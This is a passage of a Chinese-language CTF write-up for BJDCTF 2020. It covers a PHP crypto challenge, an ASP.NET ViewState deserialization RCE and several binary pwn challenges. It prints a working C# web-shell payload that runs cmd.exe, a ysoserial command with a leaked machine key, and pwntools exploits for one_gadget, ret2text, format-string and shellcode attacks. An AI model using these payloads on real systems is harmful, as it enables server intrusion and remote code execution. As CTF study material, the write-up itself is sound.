class="hljs-keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="hljs-string">'user'</span>] = md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="hljs-string">'decrypt'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">        <span class="hljs-keyword">include</span> <span class="hljs-string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="hljs-string">'y1ng'</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="hljs-keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        header(<span class="hljs-string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">    <span class="hljs-comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="hljs-number">0</span>,<span class="hljs-number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="hljs-number">40</span>,<span class="hljs-number">80</span>);</span><br><span class="line">    $_SESSION[<span class="hljs-string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>删掉cookie中的PHPSESSION明文就为空，密钥知道，vi也知道了，就能加密出密文。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-25 113017.png" alt></p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-25 113320.png" alt></p>
+<h2 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h2><p>这题在比赛时候也没做出来，根据hint找到了HITCON 2018的类似一道题目，根据<a href="https://cyku.tw/ctf-hitcon-2018-why-so-serials/" target="_blank" rel="noopener">cyku师傅的writeup</a>尝试powershell反弹shell并没有成功。等官方writeup出来的时候又是cyku师傅的又一篇<a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">文章</a>复现一下，cyku师傅太强了。</p>
+<p>进去网页点下Click me!出来一张图片，F12看见应该是存在文件读取。</p>
+<p>穿越了两个目录顺利读到了<code>web.config</code>。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-25 154230.png" alt></p>
+<p>第二个hint的VIEWSTATE是使用asp.net控件就会有的东西，查阅资料得知VIEWSTATE配合<code>machineKey</code>是能够RCE的。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-25 154528.png" alt></p>
+<p>下载<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.exe</a>，把<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319</code>目录下的<code>System.dll</code>和<code>System.Web.dll</code>复制过来，保存以下代码为<code>ExploitClass.cs</code>。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>(<span class="hljs-params"></span>)</span></span><br><span class="line"><span class="hljs-function"></span>    &#123;</span><br><span class="line">        System.Web.HttpContext context = System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        <span class="hljs-keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Process process = <span class="hljs-keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="hljs-string">"cmd.exe"</span>;</span><br><span class="line">            <span class="hljs-keyword">string</span> cmd = context.Request.Form[<span class="hljs-string">"cmd"</span>];</span><br><span class="line">            process.StartInfo.Arguments = <span class="hljs-string">"/c "</span> + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput = <span class="hljs-literal">true</span>;</span><br><span class="line">            process.StartInfo.RedirectStandardError = <span class="hljs-literal">true</span>;</span><br><span class="line">            process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;</span><br><span class="line">            process.Start();</span><br><span class="line">            <span class="hljs-keyword">string</span> output = process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用上面读<code>web.config</code>获取到的<code>machineKey</code>用<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.exe</a>生成<code>VIEWSTATE</code>。</p>
+<figure class="highlight powershell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile   -c <span class="hljs-string">"ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll"</span> --generator=<span class="hljs-string">"CA0B0334"</span> -c  --validationalg=<span class="hljs-string">"SHA1"</span>  --validationkey=<span class="hljs-string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span></span><br></pre></td></tr></table></figure>
+<p>回到主页点下Click me!，将请求中的<code>VIEWSTATE</code>换成ysoserial.exe生成的，再加个post参数cmd，值为cmd命令。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-25 163811.png" alt></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p><code>init</code>函数直接输出了<code>printf</code>的地址，题目名字很直接，叫<code>one_gadget</code>，又提供了<code>libc</code>，直接<code>one_gadget</code>一把梭。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="hljs-number">0L</span>L, <span class="hljs-number">2</span>, <span class="hljs-number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0L</span>L, <span class="hljs-number">1</span>, <span class="hljs-number">0L</span>L);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"here is the gift for u:%p\n"</span>, &amp;<span class="hljs-built_in">printf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>main</code>函数这里值得注意的是：存在的漏洞不是栈溢出，而直接跳转到输入的内容处执行，所以我们输入的<code>one_gadget</code>要转为整型再转为字符串。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me your one gadget:"</span>, argv);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%ld"</span>, &amp;v4);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v4(<span class="hljs-string">"%ld"</span>, &amp;v4);	<span class="hljs-meta"># vuln</span></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>附上exp</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./one_gadget'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./one_gadget'</span>)</span><br><span class="line">    libc = context.binary.libc</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26018</span>)</span><br><span class="line">    libc = ELF(<span class="hljs-string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="hljs-string">'./one_gadget'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">'u:'</span>)</span><br><span class="line">data = int(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)</span><br><span class="line">base = data - libc.sym[<span class="hljs-string">'printf'</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xe237f</span></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xe2383</span></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xe2386</span></span><br><span class="line">one_gadget = base + <span class="hljs-number">0x106ef8</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xc83ba</span></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xc83bd</span></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xc83c0</span></span><br><span class="line"><span class="hljs-comment"># one_gadget = base + 0xe652b</span></span><br><span class="line"></span><br><span class="line">payload = str(int(one_gadget))</span><br><span class="line">p.recvuntil(<span class="hljs-string">'gadget:'</span>)</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><p>漏洞在<code>name_check</code>函数里，参数s最多能输入到<code>0x400</code>个字节，<code>strcpy</code>到<code>dest</code>里就会造成栈溢出。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">name_check</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> dest; <span class="hljs-comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="hljs-built_in">strlen</span>(s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">3u</span> || v3 &gt; <span class="hljs-number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Oops,u name is too long!"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello,My dear %s"</span>, s);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但在<code>strcpy</code>前对的长度进行限制，不过仔细看发现对跟<code>v3</code>比较的数字类型都是<code>unsigned int</code>型，在汇编里也能看见取<code>eax</code>的低位跟3和8比较，所以只要令到<code>s</code>的长度在<code>0xx04</code>到<code>0xx07</code>之间就能绕过了。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 182203.png" alt></p>
+<p>最后ret2text到预留的backdoor就行。附上exp</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./r2t3'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./r2t3'</span>)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29906</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="hljs-string">'./r2t3'</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.sym[<span class="hljs-string">'_dl_registery'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="hljs-number">21</span>),backdoor,cyclic(<span class="hljs-number">235</span>)+<span class="hljs-string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">'[+]Please input your name:'</span>)</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><p>这题开了<code>canary</code>，但存在格式化字符串漏洞，<code>carray</code>并没有什么卵用。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 184024.png" alt></p>
+<p>不过这里的格式化字符串没有循环，尝试覆写<code>.fini_array</code>里函数的<code>got</code>表，但没有成功。最后故意栈溢出，让程序调用<code>___stack_chk_fail</code>，覆写<code>___stack_chk_fail</code>的<code>got</code>使得程序跳转到<code>backdoor</code>。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x38</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>附上exp</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./r2t4'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./r2t4'</span>)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28071</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="hljs-string">'./r2t4'</span>)</span><br><span class="line"></span><br><span class="line">addr = elf.got[<span class="hljs-string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor = elf.sym[<span class="hljs-string">'backdoor'</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_fmt</span><span class="hljs-params">(payload)</span>:</span></span><br><span class="line">    p = process(<span class="hljs-string">'./r2t4'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="hljs-keyword">return</span> data</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">payload = fmtstr_payload(offset,&#123;addr:backdoor&#125;).ljust(<span class="hljs-number">0x38</span>,<span class="hljs-string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>程序保护全开，好像没什么漏洞，尝试绕过过滤。找了很久发现<code>od ????</code>可以，但是出来的是这些玩意，直接解码不行。想得头都穿了，差点要写脚本爆破了。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 212740.png" alt></p>
+<p>后来看了官方文档才知道，默认两个字节合起来转为八进制。用脚本解一下。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="hljs-string">'066146 063541 063173 034461 030141 033470 026546 063067 030545 032055 030143 026471 061471 033471 034455 034470 032064 033544 032071 032467 076463 077412 046105 001106 000401 000000 000000 000000 000000 001000 037000 000400 000000 000000 040006 000000 000000 040000 000000 000000 000000 014000 000033 000000 000000 000000 000000 040000 034000 004400 040000 017400 016000 003000 000000 002400 000000 040000 000000 000000 000000 040000 040000 000000 000000 040000 040000 000000 000000 174000 000001 000000 000000 174000 000001 000000 000000 004000 000000 000000 000000 001400 000000 002000 000000 034000 000002 000000 000000 034000 040002 000000 000000 034000 040002 000000 000000 016000 000000 000000 000000 016000 000000 000000 000000 000400 000000 000000 000000 000400 000000 002400 000000 000000 000000 000000 000000 000000 040000 000000 000000 000000 040000 000000 000000 132000 000013 000000 000000 132000 000013 000000 000000 000000 020000 000000 000000 000400 000000 003000 000000 010000 000016 000000 000000 010000 060016 000000 000000 010000 060016 000000 000000 054000 000002 000000 000000 060000 000002 000000 000000 000000 020000 000000 000000 001000 000000 003000 000000 024000 000016 000000 000000 024000 060016 000000 000000 024000 060016 000000 000000 150000 000001 000000 000000 150000 000001 000000 000000 004000 000000 000000 000000 002000 000000 002000 000000 052000 000002 000000 000000 052000 040002 000000 000000 052000 040002 000000 000000 042000 000000 000000 000000 042000 000000 000000 000000 002000 000000 000000 000000 050000 072345 002144 000000 104000 000012 000000 000000 104000 040012 000000 000000 104000 040012 000000 000000 032000 000000 000000 000000 032000 000000 000000 000000 002000 000000 000000 000000 050400 072345 003144 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000 000000'</span></span><br><span class="line"></span><br><span class="line">e = e.split(<span class="hljs-string">' '</span>)</span><br><span class="line">ans = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> e:</span><br><span class="line">    ans += hex(int(o,<span class="hljs-number">8</span>))[<span class="hljs-number">2</span>:][<span class="hljs-number">2</span>:]</span><br><span class="line">    ans += hex(int(o,<span class="hljs-number">8</span>))[<span class="hljs-number">2</span>:][:<span class="hljs-number">2</span>]</span><br><span class="line"></span><br><span class="line">ans = ans.split(<span class="hljs-string">'0a'</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">print(ans.decode(<span class="hljs-string">'hex'</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h2><p>gdb退了几次再进去看到diff里文件二的栈地址都是一样的，我鬼使神差的以为他栈地址是不变的，gdb里能getshell，命令行里执行就不行。。有没有师傅知道是为什么。。</p>
+<p>被搞晕了，没注意到文件一的内容直接写进bss，可以通过这个getshell，看了别的师傅的writeup才知道，太粗心了。</p>
+<p>漏洞处在<code>compare</code>函数里，addr也就是文件二读取没有限制长度，超过0x78字节就会溢出，而buf1是读到bss里的，有因为没有开NX，可以直接控制程序跳到buf1处执行shellcode。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> fd)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> addr[<span class="hljs-number">120</span>]; <span class="hljs-comment">// [esp+8h] [ebp-78h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="hljs-number">0</span>;</span><br><span class="line">  JUMPOUT(sys_read(fd, buf1, <span class="hljs-number">0x80</span>u), <span class="hljs-number">0</span>, &amp;failed);</span><br><span class="line">  JUMPOUT(sys_read(a1, addr, <span class="hljs-number">0x80</span>u), <span class="hljs-number">0</span>, &amp;failed);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; addr[i] + buf1[i] &amp;&amp; i &lt; <span class="hljs-number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = buf1[i];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v2 != addr[i] )</span><br><span class="line">      <span class="hljs-keyword">return</span> v4 + <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">10</span> )</span><br><span class="line">      ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>附上exp</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">buf = <span class="hljs-number">0x0804A024</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = flat(cyclic(<span class="hljs-number">124</span>),buf)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./diff'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(argv=[<span class="hljs-string">'diff'</span>,<span class="hljs-string">'/tmp/123'</span>,<span class="hljs-string">'/tmp/456'</span>],executable=<span class="hljs-string">'./diff'</span>)</span><br><span class="line">    f1 